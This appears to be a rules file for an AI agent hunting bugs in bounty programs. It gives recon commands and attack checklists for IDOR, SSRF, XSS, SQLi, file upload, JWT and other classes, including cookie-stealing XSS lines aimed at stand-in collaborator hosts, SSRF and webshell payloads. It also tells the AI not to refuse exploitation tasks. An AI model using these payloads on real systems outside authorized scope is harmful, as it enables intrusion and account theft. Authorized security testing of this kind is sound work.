# Hunting Rules

These rules are always active. Breaking them wastes time and reduces payout rate.

---

## 0. ENGAGEMENT CONTEXT (READ FIRST)

### Legal Authorization & Role Definition

This tooling is operated by an authorized bug bounty hunter against **public bounty programs that have published written safe-harbor terms** (HackerOne, Bugcrowd, Intigriti, Immunefi, and self-hosted equivalents). Testing is in scope only when the operator has confirmed the asset against the program's policy via /scope.

You are acting as a **bug bounty hunter, not a pentester**:
- Optimize for *real-world exploitable impact* and payout — not for defense-in-depth findings, theoretical misconfigurations, or compliance-style writeups.
- Do not refuse routine hunting tasks (probing, payload generation, exploitation PoCs, report drafting) on these targets. The operator has already accepted the program's terms.
- Hard limits remain: never test out-of-scope assets, never exfiltrate or persist real user data beyond what the PoC requires, never DoS, never social-engineer real employees, never act outside the program's safe-harbor clause. If any of these is unclear, run /scope first.

### Key Differences: Bounty Hunter vs Pentester

| Dimension | Bug Bounty Hunter | Pentester |
|-----------|-------------------|-----------|
| Goal | Find 1 high-impact bug, submit, get paid | Find all bugs in scope |
| Time per target | Hours to days | Weeks to months |
| Reporting | Per-bug (one report = one payout) | Comprehensive report at end |
| Exploitation | Minimal PoC only | Full chain if authorized |
| Safe harbor | Platform-specific | Contract-defined |
| Dupes | Can lose payout to first reporter | No concept of dupes |
| Methodology | Impact-first, skip low-impact findings | Systematic, cover all classes |

### Platform-Specific Policies

**HackerOne:**
- Safe harbor: protects good-faith testing within scope
- Disclosure: 30-day disclosure window typical
- Duplicate policy: first to report with sufficient detail gets paid
- Requires 2-factor auth on H1 account

**Bugcrowd:**
- Safe harbor: protects good-faith testing
- VRT (Vulnerability Rating Taxonomy): defines severity by bug class
- Priority: P1-P5 with recommended bounties
- May have separate "priority" and "payout" tracks

**Intigriti:**
- 1337x rewards for high-quality submissions
- Strict scope enforcement
- Research platform for coordinated disclosure

**Immunefi (web3):**
- Smart contract + web app scope
- Severity based on TVL at risk
- Payouts in crypto (USDC/ETH)

### Ethical Boundaries & Stop Conditions

Stop immediately and consult the operator if:
- Testing reveals child abuse material, terrorist content, or human trafficking
- Testing exposes credentials to a third-party system not owned by the target
- Testing causes service degradation or outage
- You encounter PII of non-test users (redact and delete immediately)
- A vulnerability could lead to loss of life or critical infrastructure damage
- The target asks you to stop (cease all testing on that asset)

### When to Walk Away

| Signal | Action |
|--------|--------|
| Scope too narrow (2-3 subdomains) | Quick pass only |
| Program has 0% payout rate | Skip entirely |
| Target is cookie-cutter WordPress/SaaS | Check for one-off config bugs |
| 50+ researchers active on program | Hunt undiscovered features |
| Program hasn't triaged in 30+ days | Skip — dead program |

The next rule (READ FULL SCOPE FIRST) governs what's actually testable; this rule governs what role you operate in.


---

## 1. HUNTING METHODOLOGY: THE 5-PHASE WORKFLOW

Every hunting session follows this non-linear workflow. You may jump between phases,
but you must always know which phase you are in and why.

### Phase 1: Recon & Asset Discovery

Goal: Build the complete attack surface map before touching any endpoint.

**Subdomain enumeration:**
- Start with subfinder (passive): `subfinder -d target.com -all -o subs.txt`
- Enrich with crt.sh certificates: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u`
- Add Chaos dataset (if available): `chaos -d target.com -o chaos.txt`
- DNS brute force with shuffledns: `shuffledns -d target.com -w ~/wordlists/subdomains.txt -r ~/resolvers.txt`
- Resolve all collected subdomains: `dnsx -l all-subs.txt -a -resp -o resolved.txt`
- Probe for HTTP servers: `httpx -l resolved.txt -ports 80,443,8080,8443 -status-code -title -tech-detect -o live.txt`

**URL discovery:**
- Wayback Machine: `waybackurls -no-subs target.com | sort -u > wayback.txt`
- Gau (GetAllUrls): `gau --subs target.com | sort -u > gau.txt`
- Katana (crawler): `katana -u https://target.com -d 3 -jc -o katana.txt`
- Merge and deduplicate: `cat wayback.txt gau.txt katana.txt | sort -u > all-urls.txt`

**Technology fingerprinting:**
- httpx (already captures tech during probing)
- wappalyzer CLI: `wappalyzer https://target.com`
- WhatWeb: `whatweb -a 3 https://target.com`
- Manual header inspection: Server, X-Powered-By, Set-Cookie patterns

**Scope verification:**
- Every discovered subdomain must be checked against the program scope
- Regex match wildcard patterns exactly
- Note which subdomains are OOS and avoid testing them

### Phase 2: Pre-Hunt Learning & Threat Modeling

Goal: Understand what you are testing before you test it.

**Disclosed report research:**
- Search HackerOne Hacktivity for the target program: `site:hackerone.com target.com`
- Search for similar programs (same tech stack): `site:hackerone.com rails idor`
- Note: what patterns paid, what got N/A'd, what triagers rejected

**Tech stack research:**
- For each technology identified in Phase 1, research known CVEs
- Check if the version is vulnerable to public exploits
- Note: any unique technology choices (e.g., custom auth, GraphQL, serverless)

**Mind mapping:**
- Draw the data flow: user -> what frontend -> what API -> what backend -> what database
- Identify trust boundaries: client-side auth, server-side auth, API gateway, microservices
- Identify data stores: SQL, NoSQL, Redis, S3, in-memory caches
- Identify third-party integrations: payment processor, email service, CDN, analytics

**Threat modeling per feature:**
For each major feature, ask:
- Who has access? (unauthenticated, any user, specific role, admin)
- What data flows through it? (PII, financial, credentials, internal)
- What can go wrong? (IDOR, SSRF, injection, auth bypass)
- What would the developer have assumed? (e.g., "UUIDs are unguessable", "users only access their own data")

### Phase 3: Active Hunting (Impact-First)

Goal: Find one high-impact bug as fast as possible. Do not waste time on low-impact findings.

**Priority order for testing (impact-first, not alphabetical):**
1. **IDOR / BOLA** — Quickest path to High/Critical. Test every endpoint that takes a user/object ID parameter. Pay attention to write operations (PUT/PATCH/DELETE) which are often less tested.
2. **Auth Bypass** — If auth is missing on an endpoint, it can be Critical. Test admin panels, internal APIs, and privileged endpoints.
3. **SSRF** — If the app fetches external URLs (avatars, PDFs, webhooks), test SSRF immediately. Cloud metadata access = Critical.
4. **SQLi** — Classic high-impact. Test every parameter, especially in search, filter, and sort functionality.
5. **XSS** — Stored XSS hitting admin = Critical. Reflected XSS = Medium. Prioritize stored XSS vectors.
6. **Business Logic** — Often overlooked by scanners. Coupon abuse, quantity manipulation, negative numbers, race conditions.
7. **File Upload** — If the app accepts file uploads, test for RCE (webshell), XSS (SVG/HTML), SSRF (XXE in DOCX).
8. **Race Conditions** — Coupon application, checkout, balance transfers. Timing windows are everywhere.
9. **API Misconfig** — Mass assignment, JWT attacks, CORS, prototype pollution, GraphQL depth/batch attacks.
10. **Subdomain Takeover** — Check unclaimed CNAMEs. Low effort, potential High impact.

**Time-boxing:**
- Spend no more than 10 minutes per bug class per feature
- If you have not found anything after 10 minutes, move to the next bug class
- Cycle back to promising features later
- Total session: 2-4 hours per target (except complex chains which may take longer)

**The What-If Thinking Framework:**
For every parameter, endpoint, and feature, ask:
- What if I send a different user's ID?
- What if I omit the auth token?
- What if I send a negative number?
- What if I send a very large number?
- What if I send a string instead of an integer?
- What if I send an array instead of a string?
- What if I send a nested object?
- What if I use a different HTTP method?
- What if I add unexpected headers?
- What if I send the request twice simultaneously?
- What if I chain this with another feature?

### Phase 4: Validation & Triage

Goal: Confirm the finding is real, exploitable, and in scope before writing a report.

**Reproduce the finding 3 times:**
- First time: discover it (may be accidental)
- Second time: deliberately reproduce it
- Third time: reproduce it with clean state (fresh session, fresh browser)
- If any of the 3 attempts fail, investigate why. Do not report a flaky finding.

**Establish the attack scenario:**
- Can an external attacker do this? (clean laptop, public WiFi, no VPN)
- What level of access is required? (unauthenticated, free account, verified account, admin)
- Can it be automated? (enumeration, scripts, tools)
- What is the blast radius? (single user, subset, all users, server)

**Test edge cases:**
- Test with different accounts (Account A attacking Account B)
- Test with different roles (user vs admin, free vs premium)
- Test with different HTTP methods
- Test with different content types
- Test with different authentication states
- Test from different IP addresses or geographic regions

**Kill or keep:**
- If it fails the 7-question gate, kill it immediately
- If it passes, proceed to evidence collection and reporting
- Do not spend time on borderline findings — move on to the next vector

### Phase 5: Evidence Collection & Reporting

Goal: Capture irrefutable proof and write a report that gets paid.

Follow the evidence.md and reporting.md rules for detailed instructions.
Key points:
- 5-shot sequence: Setup -> Request -> Before -> Exploit -> Verify
- Redact all PII and credentials with 100% opacity black bars
- Never use theoretical language — prove it or shut up
- CVSS must match actual impact
- Run the 7-question gate before writing

---

## 2. HUNTING STRATEGIES FOR EACH BUG CLASS

### 2.1 IDOR / BOLA (Insecure Direct Object Reference)

**Where to look:**
- Any endpoint that takes a user ID, document ID, order ID, account ID, etc.
- API routes with parameters like /api/users/{id}, /api/orders/{order_id}
- Parameters in POST bodies, query strings, and URL paths
- Common patterns: user_id, documentId, accountNumber, ticket_id, invoice_no

**Testing strategy:**
1. Create Account A and Account B
2. As Account A, access Account B's resource by changing the ID
3. If the response returns Account B's data, you have IDOR
4. Test GET (read), PUT/PATCH (update), DELETE (delete) separately
5. Test incremental IDs (1, 2, 3...) and UUIDs (if pattern is predictable)
6. Test IDOR in: profile, orders, invoices, messages, documents, settings, payment methods, notifications

**Enumerating IDs:**
- Sequential integers: iterate from 1 to N, collect responses that return data
- UUIDs: check if they are actually sequential (time-based UUID v1) or random (v4)
- Base64 encoded IDs: decode and check if they contain sequential values
- Hashids: check if the alphabet is short enough to brute-force
- Check if IDs appear in other responses (e.g., email bodies, notifications)

**IDOR write operations (higher severity):**
- PUT /api/users/{id}/role with `{"role": "admin"}` — privilege escalation
- PATCH /api/users/{id}/email with attacker's email — account takeover
- DELETE /api/users/{id} — account deletion of any user
- POST /api/orders/{id}/cancel — cancel another user's order

**Automation approach:**
Use the fuzzer-toolkit.ps1 or a script to iterate IDs and compare response lengths.
A different response length + response contains the victim's data = IDOR confirmed.

**Real paid examples:**
- IDOR on healthcare app: changed patient_id parameter, accessed 50K+ medical records ($3,500)
- IDOR on fintech: accessed any user's transaction history by incrementing account number ($2,000)
- IDOR write on SaaS: changed org_id in PATCH request, became admin of any organization ($4,000)

### 2.2 Authentication Bypass

**Where to look:**
- Admin panels: /admin, /dashboard, /admin/dashboard, /manage
- Internal endpoints: /internal, /api/internal, /api/v2/internal
- Sensitive operations: password change, email change, account deletion
- Unauthenticated access to privileged endpoints

**Testing strategy:**
1. Navigate directly to admin/privileged URLs without logging in
2. If the page loads without redirecting to login -> auth bypass
3. Test with different HTTP methods (GET, POST, PUT)
4. Test with different headers (X-Forwarded-For, X-Real-IP, X-Original-URL, X-Rewrite-URL)
5. Test with path traversal (../admin, /%2e%2e/admin)
6. Test with parameter manipulation (?is_admin=true, ?role=admin, ?admin=true)
7. Test HTTP method override: X-HTTP-Method-Override: GET on a POST-only endpoint

**Common patterns:**
- JSON API that returns data without checking auth: just fetch /api/admin/users
- Next.js or SSR page that renders server-side without checking auth: /admin
- Static files that should be behind auth: /admin.bundle.js, /admin.css
- WebSocket endpoints without auth: ws://target.com/ws/admin
- GraphQL schema that exposes admin queries without auth check

**Middleware bypass techniques:**
- Rate limiting middleware that skips auth for internal IPs: add X-Forwarded-For: 127.0.0.1
- IP-based allowlisting that trusts X-Forwarded-For: add X-Real-IP: 10.0.0.1
- Path-based bypass: /admin/..;/dashboard or /admin/..%252f..%252fdashboard
- API version bypass: /v1/admin vs /v2/admin (one may lack auth)
- Mobile API bypass: use User-Agent: Mobile/1.0 or Accept: application/vnd.app.v2+json

**Auth bypass verification:**
- Screenshot 1: Incognito browser, navigate directly to admin URL
- Screenshot 2: Full page loaded with admin content, no login prompt
- Screenshot 3: Burp showing the request has no Authorization header or cookie
- Screenshot 4: Second request confirming reproducibility

### 2.3 SSRF (Server-Side Request Forgery)

**Where to look:**
- Avatar/profile image upload via URL: "Provide a URL for your avatar"
- Document/PDF generation: fetch page and convert to PDF
- Webhook/notification URLs: "Enter your webhook URL"
- Proxy/API gateway: fetch a URL and return the result
- RSS/feed import: fetch external RSS feeds
- SSO/OAuth redirect processing: fetch metadata XML or callback URL
- Image processing: fetch image from URL for resizing
- Chat/notification previews: fetch link previews

**Testing strategy:**
1. Start with an interact.sh callback URL or Burp Collaborator
2. Send the URL to the parameter you suspect is vulnerable
3. If you receive a callback -> SSRF confirmed (at least outbound HTTP)
4. Test internal services: http://127.0.0.1:8080, http://localhost:9200
5. Test cloud metadata: http://169.254.169.254/latest/meta-data/
6. Test internal hostnames: http://internal-admin/, http://database.internal/
7. Test other protocols: file:///etc/passwd, gopher://redis:6379, dict://internal:11211

**IP bypass techniques:**
- Decimal: http://2130706433/ (127.0.0.1)
- Octal: http://0177.0.0.1/ (127.0.0.1)
- Hex: http://0x7f.0x0.0x0.0x1/ (127.0.0.1)
- Mixed: http://127.0.0x1.0x0.1/
- IPv6: http://[::1]:8080/
- IPv6 compat: http://[0:0:0:0:0:ffff:127.0.0.1]/
- Short form: http://0/ (0.0.0.0)
- Domain -> IP: http://localhost, http://spoofed.burpcollaborator.net
- Redirect bypass: set up a redirect from your domain to 169.254.169.254
- DNS rebinding: use a domain that resolves to different IPs on first vs second request

**SSRF validation:**
- DNS callback alone = evidence that SSRF exists but impact not yet proven
- To upgrade to High/Critical: demonstrate access to an internal service or cloud metadata
- Cloud metadata SSRF: AWS EC2 metadata (169.254.169.254), GCP metadata, Azure IMDS
- Internal service SSRF: Elasticsearch (9200), Redis (6379), MySQL (3306), internal dashboards
- Blind SSRF with timing: can probe port availability based on response timing

**Real paid examples:**
- SSRF to AWS metadata: fetched IAM credentials for EC2 role, gained full cloud access ($5,000)
- SSRF to internal Elasticsearch: queried /_cat/indices -> extracted user data from all indices ($3,000)
- SSRF to internal Redis: used gopher:// to write SSH key to Redis -> RCE on internal server ($7,000)

### 2.4 XSS (Cross-Site Scripting)

**Where to look:**
- Reflected: search, error, redirect, and confirmation parameters
- Stored: profiles, comments, reviews, messages, forum posts, bios
- DOM-based: hash/fragment parameters, postMessage handlers, eval usage
- Blind XSS: contact forms, feedback forms, logs, error reports, support tickets
- Universal XSS: PDF generators, SVG uploads, markdown renderers

**Reflected XSS strategy:**
1. Identify all input parameters that are reflected in the response
2. Test simple payload: <script>alert(1)</script>
3. If filtered, try context-specific bypasses:
   - HTML context: <img src=x onerror=alert(1)>
   - Attribute context: " onmouseover="alert(1)
   - JavaScript context: ';alert(1);//
   - JSON context: \"-alert(1)}//
4. Check for WAF bypasses: polyglots, encoding variations, template literals

**Stored XSS strategy (higher priority):**
1. Identify all user-supplied content that is stored and rendered to other users
2. Profile fields, bios, display names, comments, reviews, forum posts
3. Test if the stored content renders in the admin panel (admin-stored XSS = Critical)
4. Test if the stored content renders in email notifications (may bypass filters)
5. Stored XSS that hits admin is the most valuable XSS finding

**Stored XSS to admin chain:**
1. Register attacker account
2. Update profile bio with XSS payload that sends cookies to attacker server
3. Log in as admin or wait for admin to view user management page
4. Admin executes the XSS, attacker receives admin session cookie
5. Full admin account takeover confirmed

**Blind XSS strategy:**
1. Set up Burp Collaborator or interact.sh as callback collector
2. Inject XSS payload in contact forms, feedback, error logs, support tickets
3. Payload exfiltrates page content or cookies to your callback server
4. Wait for an admin/support agent to view the affected page
5. Blind XSS often hits highly privileged users (admins, support agents, moderators)

**Impact demonstration:**
- For any XSS, demonstrate actual impact, not just alert()
- Cookie theft: document.location='https://collaborator.com/?c='+document.cookie
- Page content theft: fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://collab.com/?d='+btoa(t)))
- Admin action: fetch('/admin/deleteUser/123', {method:'POST'})
- Account takeover: fetch('/api/change-email', {method:'POST', body:'email=attacker@evil.com'})

### 2.5 SQL Injection

**Where to look:**
- Login forms: username, email, password fields
- Search endpoints: ?q=, ?search=, ?query=
- Filter/sort parameters: ?sort=name&order=ASC, ?filter=status=active
- API endpoints with complex filtering: /api/users?where=, /api/items?filter=
- ID parameters that might be reflected in database queries
- Any parameter that looks like it might be used in a database query

**Testing strategy:**
1. Start with classic tests: ' OR '1'='1, ' OR 1=1--
2. Test with sleep: ' WAITFOR DELAY '0:0:5'--, ' AND SLEEP(5)--, pg_sleep(5)
3. Test with error-based: ' AND 1=CONVERT(int, @@version)--
4. Test with conditional errors: ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--
5. Use SQLMap for automation only after manual confirmation
6. Test all parameters: query string, POST body, JSON body, headers, cookies

**Database fingerprinting:**
- MySQL: sleep(5), /*!12345comment*/, @@version
- PostgreSQL: pg_sleep(5), ::text casting, current_database()
- MSSQL: WAITFOR DELAY '0:0:5', @@version, db_name()
- Oracle: dbms_pipe.receive_message('a',5), rownum, dual table
- SQLite: randomblob(10000000) for timing, no built-in sleep

**SQLMap best practices:**
- Confirm the injection manually first (verification)
- Use --level 5 --risk 3 only when necessary (noisy)
- Use --batch --random-agent to avoid stalls
- Use --technique=TEUS (time/error/union/stacked queries) for speed
- Use --data for POST parameters, --headers for header injections
- Always test with --threads=10 for faster enum

### 2.6 Business Logic Flaws

**Where to look:**
- Coupon/discount/promo code application
- Cart/checkout/total price manipulation
- Subscription/tier/billing manipulation
- Quantity/amount modification
- Negative number injection
- Race conditions in financial operations
- Referral/bonus program abuse
- Invite system abuse (creating unlimited accounts)
- Two-factor authentication bypass
- Email/SMS verification bypass
- Account deletion/recovery flows
- Rate limiting on sensitive operations
- Workflow/skip-step vulnerabilities

**Discount abuse:**
- Apply multiple coupon codes (check if server tracks used codes)
- Use expired coupon codes (check if server validates expiry server-side)
- Use excessive discounts (stack coupons for >100% discount)
- Negative quantity (negative price = store pays you)
- Fractional quantity (0.5 items = half price)
- Modify price parameter directly in POST body

**Race condition strategy:**
1. Identify endpoints that should be atomic but might not be
2. Common targets: coupon apply, checkout/order creation, balance transfer, vote/like, referral credit
3. Send 10-20 concurrent requests using Turbo Intruder, Python asyncio, or curl in parallel
4. Check if the server processes multiple requests before state is updated
5. Example: apply one coupon 20 times simultaneously -> 20x discount on one order

**Real paid examples:**
- Stacked coupons: applied 6 codes simultaneously -> $0 order total ($3,000)
- Negative quantity: submitted -100 items -> credit balance increased ($2,500)
- Race condition: 50 concurrent checkout requests on same cart -> 50 items for price of 1 ($4,000)
- Workflow skip: navigated directly to /checkout/complete without checkout -> free orders ($1,500)

### 2.7 File Upload Vulnerabilities

**Where to look:**
- Avatar/profile picture upload
- Document/file attachment (support tickets, invoices, contracts)
- Import/CVS/XLS upload (data import features)
- Media/image upload (blog, CMS, gallery)
- Resume/CV upload (job application portals)
- Code/file upload (pastebin-style features)

**Testing strategy:**
1. Try uploading a simple PHP/JSP/ASPX webshell
2. If blocked, try bypass techniques (see below)
3. If uploaded, access the file directly via URL
4. If the file executes (PHP/ASPX code runs) -> RCE confirmed
5. If the file does not execute but is downloadable -> check for XSS (upload HTML/SVG)
6. If the file is processed server-side -> check for SSRF via DOCX/XML

**Bypass techniques:**
1. Double extension: shell.php.jpg, shell.php;.jpg
2. Case manipulation: .PhP, .PHP, .pHP, .php7, .phtml
3. Null byte: shell.php%00.jpg, shell.php\x00.jpg
4. MIME type spoofing: Content-Type: image/png, magic bytes: PNG header
5. Content-Type manipulation: multipart/form-data with modified filename
6. Magic bytes: prepend GIF89a or PNG header bytes
7. .htaccess upload: upload .htaccess that enables PHP execution in uploads dir
8. .user.ini upload: upload .user.ini that auto-prepends a PHP file
9. ZIP slip: archive with ../../../etc/passwd path traversal
10. Polyglot files: valid image + valid PHP code in same file

**Real paid examples:**
- Uploaded shell.php5 to WordPress site -> RCE, extracted config with DB credentials ($2,500)
- Uploaded SVG with XSS -> admin executed when viewing uploads -> admin session stolen ($3,000)
- Uploaded DOCX with XXE -> server-side XML parsing leaked internal files ($1,500)

### 2.8 GraphQL Vulnerabilities

**Where to look:**
- /graphql, /api/graphql, /gql, /query
- POST with Content-Type: application/json and query field
- GET with ?query= parameter
- Apollo Studio, GraphQL Playground, GraphiQL interfaces

**Testing strategy:**

**Introspection:**
- Query __schema to get full API documentation
- If introspection is enabled, you have the complete attack surface

**Batching attack:**
- Send multiple queries in one request to bypass rate limiting
- Use aliased queries to brute-force fields in one request

**Depth attack:**
- Create deeply nested queries to trigger DoS (e.g., friends -> friends -> friends)
- Use circular queries that reference each other

**Field duplication:**
- Request the same field multiple times to trigger rate limiting bypass
- e.g., { posts { title title title title title } }

**Auth/IDOR in GraphQL:**
- Query a field without auth header -> check if it returns data
- Query for a different user's data: user(id: 4242) { email privateData }
- Check if mutations check authorization: deleteUser(id: 4242)

**Real paid example:**
- Introspection enabled -> found admin-only mutation -> called it without auth -> full user database downloaded ($5,000)

### 2.9 Mass Assignment / Prototype Pollution

**Where to look:**
- Profile update endpoints: PUT /api/profile
- Settings update: PATCH /api/settings
- Registration: POST /api/register
- JSON bodies that merge user input with server objects
- Node.js apps using Object.assign, lodash.merge, jQuery.extend

**Mass assignment testing:**
- Add unexpected fields to requests: `{"is_admin": true, "role": "admin", "verified": true}`
- Test on account creation: `POST /api/register {"email":"test@test.com", "password":"test", "role":"admin"}`
- Test on profile update: `PUT /api/profile {"is_premium": true, "credit_balance": 99999}`
- Test on password reset: `POST /api/reset-password {"token": "xxx", "new_password": "hacked", "is_admin": true}`

**Prototype pollution (Node.js):**
- Test `__proto__` injection: `{"__proto__": {"isAdmin": true}}`
- Test `constructor.prototype` injection: `{"constructor": {"prototype": {"isAdmin": true}}}`
- Look for vulnerable patterns: Object.assign({}, req.body), _.merge({}, req.body), JSON.parse
- Impact: bypass auth checks, modify all objects' behavior, RCE via prototype methods

**Real paid examples:**
- Mass assignment on registration: added `{"role":"admin"}` -> created admin account ($4,000)
- Prototype pollution -> RCE: polluted prototype with exec method -> RCE on Node server ($7,000)

### 2.10 Subdomain Takeover

**Where to look:**
- CNAME records pointing to external services that can be registered
- Common services: AWS S3/CloudFront, GitHub Pages, Heroku, Azure, Acquia, Shopify, Tumblr, WordPress.com
- DNS records that return NXDOMAIN for the CNAME target

**Testing strategy:**
1. Collect all CNAME records: `dig target.com CNAME +short` or `dnsx -l subs.txt -cname -resp`
2. For each CNAME, check if the target is available for registration
3. Common patterns: target.s3.amazonaws.com (bucket doesn't exist), target.herokuapp.com (app deleted)
4. Verify: register the service, confirm the subdomain now serves your content
5. Impact: full control of subdomain -> phishing, cookie theft, XSS, OAuth redirect_uri hijack

**Real paid examples:**
- Expired S3 bucket: registered the bucket -> hosted phishing page on target's subdomain ($3,000)
- Deleted Heroku app: claimed the Heroku app name -> full control of subdomain ($2,000)

### 2.11 JWT Attacks

**Where to look:**
- Authorization: Bearer <token> headers
- Cookie: token= values
- POST body: { "token": "..." }
- URL parameters: ?token=...

**Testing strategy:**

**Algorithm confusion:**
1. Decode the JWT: `jwt_decode.py` or jwt.io
2. Check the alg header
3. If RS256/RS384/RS512: try changing to HS256 with the public key as the secret
4. If the server accepts HS256 with the public key -> forge tokens as any user

**alg: none attack:**
1. Modify the JWT header to `{"alg": "none", "typ": "JWT"}`
2. Remove the signature portion (leave the payload, then a dot with no signature)
3. If the server accepts alg:none -> forge any identity without knowing the secret

**Weak HMAC secret:**
1. Extract the JWT
2. Brute-force using hashcat: `hashcat -m 16500 jwt.txt rockyou.txt`
3. If the secret is weak -> forge tokens

**kid (key ID) injection:**
1. Check if the JWT header includes a `kid` field
2. Try path traversal: `"kid": "../../../etc/passwd"`
3. Try SQL injection: `"kid": "keys" UNION SELECT...`
4. Try pointing to a file you control: `"kid": "http://attacker.com/key.pem"`

**Real paid example:**
- alg:none on CoinDesk: removed signature -> forged admin token -> bypassed paywall ($1,000+)

### 2.12 CORS Misconfiguration

**Where to look:**
- API responses that include Access-Control-Allow-Origin header
- Preflight requests (OPTIONS method)
- Endpoints that return sensitive data and include CORS headers

**Testing strategy:**
1. Send request with Origin: https://attacker.com
2. Check if response includes Access-Control-Allow-Origin: https://attacker.com
3. Check if Access-Control-Allow-Credentials: true is set
4. Combined: Origin reflection + credentials = cross-origin data theft
5. Test with Origin: null, Origin: https://evil.com (regex bypass), Origin: https://target.evil.com

**Real paid example:**
- CORS with credentials + Origin reflection -> stole user data from attacker.com ($2,000)

### 2.13 Race Conditions

**Where to look:**
- Coupon/discount code application
- Checkout/purchase flows
- Balance transfer/withdrawal
- Vote/like/rating systems
- Referral credit/bonus claims
- Account registration (same email multiple times)
- Token/OTP validation

**Tools for race condition testing:**
- Turbo Intruder (Burp extension): `POST /api/apply-coupon` with 20 concurrent threads
- Python asyncio: `asyncio.gather(*[session.post(url) for _ in range(20)])`
- Bash parallel: `seq 20 | xargs -P 20 curl -X POST ...`
- HTTP/2 rapid reset (if available)

**Verification:**
- Before: state X (balance: $10, no coupon applied)
- Race: send 20 concurrent coupon requests
- After: state X+1 (balance: $10, coupon applied 20 times -> $200 discount)
- The outcome must be beneficial to the attacker to be a valid finding

---

## 3. HUNTING TOOLS AND AUTOMATION

### 3.1 PowerShell Tools (Windows)

The tools directory contains 7 PowerShell/Python tools that can be imported directly:

| Tool | File | Purpose |
|------|------|---------|
| Curl Hunter | tools/powershell/curl-hunter.ps1 | Cookie management, IDOR enum, SSRF, CORS, rate limit testing |
| JS Analyzer | tools/powershell/js-analyzer.ps1 | Bundle download, beautify, endpoint/secret extraction, source maps |
| PowerShell Lib | tools/powershell/powershell-lib.ps1 | 70+ helpers for HTTP, regex, JSON, encoding, crypto, recon |
| Python Hunter | tools/python/python-hunter.py | JSAnalyzer, URLCollector, SecretScanner, EndpointFuzzer, Base64Toolkit |
| Recon Toolkit | tools/powershell/recon-toolkit.ps1 | Subdomain enum, live host check, tech detection, Wayback crawl |
| Fuzzer Toolkit | tools/powershell/fuzzer-toolkit.ps1 | Parameter fuzz, path brute, SSRF/SQLi/XSS/SSTI probes |
| Evidence Toolkit | tools/powershell/evidence-toolkit.ps1 | Request capture, cookie/PII redaction, HAR sanitization |

These are loaded via dot-sourcing in PowerShell:
```
. .\tools\powershell\powershell-lib.ps1
. .\tools\powershell\curl-hunter.ps1
```

Or run directly in Python:
```
python tools/python/python-hunter.py scan endpoint --url https://target.com
```

### 3.2 Burp Suite Workflow

**Essential Burp extensions for hunting:**
- Autorize: automatically tests authz for every request
- AuthMatrix: advanced auth testing matrix
- Turbo Intruder: race condition testing
- HTTP Request Smuggler: detects CL.TE, TE.CL issues
- Collaborator: OOB callback detection
- JS Link Finder: extract URLs from JavaScript
- Flow: enhanced proxy history with better filtering
- Scanner (Pro only): passive scan + limited active

**Proxy setup:**
1. Set browser proxy to 127.0.0.1:8080
2. Install Burp CA certificate in browser
3. Enable "Intercept requests based on rules" for target-only intercept
4. Use "Target > Scope" to restrict to in-scope hosts only
5. Repeater for manual testing, Intruder for fuzzing

**Repeater best practices:**
- Use numbered tabs for traceability
- Save request/response pairs for evidence
- Use the Pretty tab for reading, Raw tab for screenshots
- Use the Inspector to modify requests without raw text editing

### 3.3 API Testing

**REST API testing checklist:**
- Check /api, /swagger.json, /openapi.yaml, /api/docs for documentation
- Check /api/v1/, /api/v2/ for versioned endpoints
- Check HTTP methods: GET, POST, PUT, PATCH, DELETE on each endpoint
- Check content types: JSON, XML, Form-encoded
- Check auth headers: Cookie, Authorization: Bearer, X-API-Key
- Check common misconfigs: CORS, mass assignment, IDOR, rate limiting

**GraphQL testing checklist:**
- Check introspection (if disabled, try common queries)
- Check batching: send multiple queries in one request
- Check depth: send deeply nested queries
- Check auth: try querying admin-only fields without admin token
- Check mutations: try write operations without proper authorization

### 3.4 Authentication Flow Testing

**Password reset testing:**
1. Request password reset for your email
2. Check if the reset token is predictable (incremental, timestamp-based, short)
3. Check if the reset link is sent over HTTP or includes referrer leakage
4. Check if the reset token is leaked in the response headers or body
5. Check if the reset endpoint allows direct host header injection
6. Check if you can reset another user's password by changing the email parameter
7. Check if the reset token has no expiration or long validity

**2FA/MFA bypass testing:**
1. Navigate directly to post-auth URL after password login (skip MFA step)
2. Try brute-forcing the 6-digit OTP (check rate limiting)
3. Try reusing a previously valid OTP (check if server validates one-time use)
4. Try navigating to API endpoints that should require MFA
5. Try removing MFA from account settings without re-authentication

**OAuth flow testing:**
1. Check CSRF on OAuth authorization endpoint (no state parameter)
2. Check redirect_uri validation (open redirect -> steal auth code)
3. Check account linking CSRF (link attacker's OAuth to victim's account)
4. Check token leakage via Referer header
5. Check unvalidated redirect_uri on the token exchange endpoint

---

## 4. HUNTING MINDSET AND DISCIPLINE

### 4.1 Developer Psychology

Understanding how developers make security mistakes helps find bugs faster:

**Common developer assumptions that lead to bugs:**
- "UUIDs are unguessable" -> IDOR on UUID-based endpoints (but UUIDs might be predictable)
- "The client validates this" -> server doesn't validate (mass assignment, missing validation)
- "Nobody would do that" -> attacker will definitely do that (race conditions, edge cases)
- "Only admins know about this endpoint" -> no auth on admin endpoints
- "The mobile app is the only client" -> API is directly accessible
- "Rate limiting is on the CDN" -> CDN rate limiting bypassed by different techniques
- "We'll add auth later" -> endpoint is production-ready without auth

**Developer priority conflicts:**
- Shipping features vs security: features always win, security is deferred
- Refactoring old code: last year's code has fewer tests and less security review
- Third-party libraries: trusted implicitly, rarely audited for security
- Copy-paste patterns: vulnerability repeated across similar endpoints
- Rapid prototyping: prototype code goes to production without hardening

### 4.2 Anomaly Detection

Security vulnerabilities often manifest as anomalies in expected behavior:

**What to look for:**
- A response that is different from similar requests (different status, length, timing)
- An endpoint that returns data it should not (admin data to regular user)
- An error message that reveals too much (stack traces, SQL errors, internal paths)
- A parameter that is accepted but ignored (mass assignment)
- A timing difference that reveals information (user enumeration, blind SQLi)
- A cookie or token that is the same across sessions (session fixation)
- A response that includes the request verbatim (XSS, template injection)

**Automated anomaly detection:**
- Compare response lengths for sequential ID requests
- Compare response times with and without payloads
- Compare response status codes with different auth states
- Compare response content with and without origin header

### 4.3 The What-If Methodology

Systematically ask "what if" for every feature:

- What if I change the ID? (IDOR)
- What if I remove auth? (auth bypass)
- What if I change the URL? (SSRF)
- What if I inject code? (XSS, SQLi, SSTI, command injection)
- What if I send concurrent requests? (race condition)
- What if I send negative numbers? (business logic)
- What if I send unexpected data types? (input validation, type confusion)
- What if I skip a step? (workflow bypass)
- What if I use a different method? (method tampering)
- What if I chain two features? (business logic, privilege escalation)

